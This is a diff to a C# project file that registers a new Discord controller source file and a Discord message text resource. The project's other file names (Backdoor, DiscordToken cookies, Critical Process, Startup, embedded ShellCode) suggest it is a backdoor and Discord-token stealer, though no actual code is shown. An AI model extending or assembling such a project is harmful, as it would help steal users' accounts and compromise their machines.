@@ -119,6 +119,7 @@
   <ItemGroup>
     <Compile Include="Armitage\Backdoor.cs" />
     <Compile Include="Armitage\Compiler.cs" />
+    <Compile Include="Armitage\Controllers\Discord Controller.cs" />
     <Compile Include="Armitage\Cookies\DiscordToken.cs" />
     <Compile Include="Armitage\Critical Process.cs" />
     <Compile Include="Armitage\Startup.cs" />
@@ -158,6 +159,7 @@
   </ItemGroup>
   <ItemGroup>
     <Content Include="Resources\Icon.ico" />
+    <Content Include="Resources\Letters\DiscordMessage.txt" />
     <EmbeddedResource Include="Resources\ShellCode.txt" />
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
